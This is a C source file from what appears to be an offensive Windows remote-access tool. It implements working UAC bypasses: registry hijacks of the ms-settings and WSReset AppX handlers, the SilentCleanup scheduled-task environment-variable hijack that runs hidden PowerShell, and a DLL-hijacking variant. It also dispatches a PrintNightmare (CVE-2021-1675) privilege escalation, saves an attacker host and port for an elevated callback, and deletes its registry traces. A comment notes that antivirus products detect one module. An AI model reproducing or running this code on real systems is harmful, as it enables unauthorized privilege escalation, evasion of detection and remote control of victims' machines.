#include <Windows.h>
#include <stdio.h>

#include "MgArguments.h"
#include "Tools.h"
#include "Message.h"
#include "CheckSystem.h"
#include "DllHijacking.h"
#include "PrintNightmareLPE.h"

#define MAX_CLEANUP_TRY     10
#define SLEEP_1_SEC         1000

#define MAX_BUFFER          1024

typedef struct {
    char* exploitName;
    char* regKeyName;
    char* targetExe;
} UAC_BYPASS_DATA;

UAC_BYPASS_DATA uac_bypass_data[] = {
    // To many Anti-Virus detect this module as a exploit ! (e.g. Windows Defender/Avast/...)
    /*{"fodhelper", "ms-settings", "Software\\Classes\\ms-settings\\Shell\\Open\\command",
        "C:\\Windows\\System32\\fodhelper.exe"},*/
    {"computerdefaults", "ms-settings",  "C:\\Windows\\System32\\computerdefaults.exe"},
    {"WSReset", "AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2","C:\\Windows\\System32\\WSReset.exe"},
};

BOOL ExploitCleanUp(char* regPath, char* regName) {
    char* lpSubKey = (char*)malloc(MAX_PATH + 1);
    if (lpSubKey != NULL) {
        BOOL result;
        sprintf_s(lpSubKey, MAX_PATH + 1, "%s\\%s", regPath, regName);
        result = RegDelnodeRecurse(HKEY_CURRENT_USER, lpSubKey);
        free(lpSubKey);
        return result;
    }
        
    return FALSE;
}

BOOL ExploitSilentCleanup(char* PathExeToRun, WCHAR* ipAddress, char* port) {
    BOOL returnValue = FALSE;
    PVOID pOldVal = NULL;

    char* command = (char*)malloc(MAX_BUFFER);
    if (command == NULL)
        return FALSE;

    sprintf_s(command, MAX_BUFFER, "powershell -windowstyle hidden %s;exit;", PathExeToRun);

    DisableWindowsRedirection(&pOldVal);
    if (SetRegistryValue(HKEY_CURRENT_USER, (char*)"Environment", "windir", command)) {
        if (SaveRHostInfo(ipAddress, port)) {

            // schtasks.exe error ???
            returnValue = Run("schtasks.exe", "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
        } else
            printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");

        ExploitCleanUp("Environment", "windir");
    }
    RevertWindowsRedirection(pOldVal);

    free(command);
    return returnValue;
}


BOOL ExploitOpenShell(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
    BOOL returnValue = FALSE;
    PVOID pOldVal = NULL;
    char* regKey = (char*)malloc(MAX_PATH +1);

    if (regKey == NULL)
        return FALSE;
    sprintf_s(regKey, MAX_PATH, "Software\\Classes\\%s\\Shell\\Open\\command", uac_bypass_data[UacBypassTec].regKeyName);
    

    DisableWindowsRedirection(&pOldVal);

    if (checkKey(regKey)) {
        returnValue = SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "DelegateExecute", "");
        returnValue &= SetRegistryValue(HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
        if (returnValue) {
            if (SaveRHostInfo(ipAddress, port)) {
                returnValue = RunAs(uac_bypass_data[UacBypassTec].targetExe, NULL);
            }else
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
        }
        ExploitCleanUp("Software\\Classes", uac_bypass_data[UacBypassTec].regKeyName);
    }
    RevertWindowsRedirection(pOldVal);

    free(regKey);
    return returnValue;
}

BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
    BOOL returnValue = FALSE;
    if (UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
        printMsg(STATUS_OK, LEVEL_DEFAULT, "Local Privilege Escalation: 'PrintNightmare - (CVE-2021-1675)'\n");
        returnValue = ExploitPrintNightmareLPE(PathExeToRun, ipAddress, port, wincatDefaultDir);
    } else{
        if (!IsUACEnabled()){
            printMsg(STATUS_WARNING, LEVEL_DEFAULT, "UAC is disabled.\n");
            if (!SaveRHostInfo(ipAddress, port)){
                printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST information");
                return FALSE;
            }
            return RunAs(PathExeToRun, NULL);
        } else{
            UAC_POLICY uacPolicy = CheckUACSettings();
            if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE){

                if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN){
                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
                    returnValue = ExploitSilentCleanup(PathExeToRun, ipAddress, port);

                } else if (UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR){

                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
                    returnValue = ExploitTrustedDirectories(PathExeToRun, ipAddress, port);
                } else{

                    printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
                    returnValue = ExploitOpenShell(PathExeToRun, ipAddress, port, UacBypassTec);

                }
            }
        }
    }
    return returnValue;
}